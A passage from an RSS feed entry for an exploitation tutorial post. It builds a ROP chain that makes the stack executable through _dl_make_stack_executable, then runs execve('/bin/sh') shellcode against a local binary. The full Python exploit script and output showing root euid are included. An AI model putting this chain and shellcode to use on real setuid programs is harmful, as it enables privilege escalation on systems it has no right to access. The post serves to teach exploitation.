-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc74&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;                   	&lt;span class=&quot;k&quot;&gt;pop&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbx&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc75&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;c3&lt;/span&gt;                   	&lt;span class=&quot;n&quot;&gt;retq&lt;/span&gt;   
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We can see two important things. First, the function take “__libc_stack_end” as single parameter and it encapsulate the mprotect function. (cf man mprotect) The third parameter of the mprotect function determine the memory access. (PROT_NONE | PROT_READ | PROT_WRITE | PROT_EXEC) By default, the value is set to “O” for none access, so our goal will be to set this value to “7”. (7 == rwx) To do this, we need to change the value of “__stack_prot” because it’s the variable used by mprotect as third parameter.&lt;/p&gt;
-
-&lt;p&gt;So our payload will look like this:
-padding + set __stack_prot to 7 + set RDI to __libc_stack_end + execute _dl_make_stack_executable + push shellcode&lt;/p&gt;
-
-&lt;h1 id=&quot;3-the-payload&quot;&gt;3. The payload&lt;/h1&gt;
-&lt;p&gt;I will not explain how to find the gadget, take a look at my last post if you don’t now how to do it.
-First, the __stack_prot address:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; a.out | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;__stack_prot&quot;&lt;/span&gt;
-00000000006b3f80 &amp;lt;__stack_prot&amp;gt;:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Great. So our payload begin will be:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# padding&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000004016b7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# pop rsi ; ret&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000006b3f80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# @ __stack_prot&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000004314ad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# pop rax ; ret&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000000007&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# PROT_EXEC|PROT_READ|PROT_WRITE|PROT_NONE&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000045f491&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# mov QWORD PTR [rsi], rax ; ret&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We also will need the address of the “__libc_stack_end” variable and “_dl_make_stack_executable” function.&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; a.out|egrep &lt;span class=&quot;s2&quot;&gt;&quot;__libc_stack_end|_dl_make_stack_executable&quot;&lt;/span&gt;
-...
-000000000045fc30 &amp;lt;_dl_make_stack_executable&amp;gt;:
-...
-00000000006b3f28 &amp;lt;__libc_stack_end&amp;gt;:
-...
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;And the payload part look like:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000040159b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# pop rdi ; ret&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000006b3f28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# @ __libc_stack_end&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000045fc30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# @ _dl_make_stack_executable&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Well, we only have left to push the shellcode and test it ! 
-The shellcode is a simply execve(“/bin/sh”, …) on 30 bytes.
-To push the shellcode:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000040fd8c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# push rsp ; ret&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;4-exploitation&quot;&gt;4. Exploitation&lt;/h1&gt;
-&lt;p&gt;The whole payload look like:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python2.7&lt;/span&gt;
-
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Shellcode execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL) (30 bytes)&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# padding&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000004016b7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# pop rsi ; ret&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000006b3f80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# @ __stack_prot&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000004314ad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# pop rax ; ret&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000000007&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# PROT_EXEC|PROT_READ|PROT_WRITE|PROT_NONE&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000045f491&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# mov QWORD PTR [rsi], rax ; ret&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000040159b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# pop rdi ; ret&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000006b3f28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# @ __libc_stack_end&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000045fc30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# @ _dl_make_stack_executable&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000040fd8c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# push rsp ; ret&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The result is:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python2.7 rop.py&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | ./a.out
-id
-&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Done.&lt;/p&gt;
-</description>
-				<pubDate>Thu, 26 Jan 2017 00:00:00 +0000</pubDate>
-				<link>/pwn/2017/01/26/ret_to_stack.html</link>
-				<guid isPermaLink="true">/pwn/2017/01/26/ret_to_stack.html</guid>
 			</item>
 		
 	</channel>
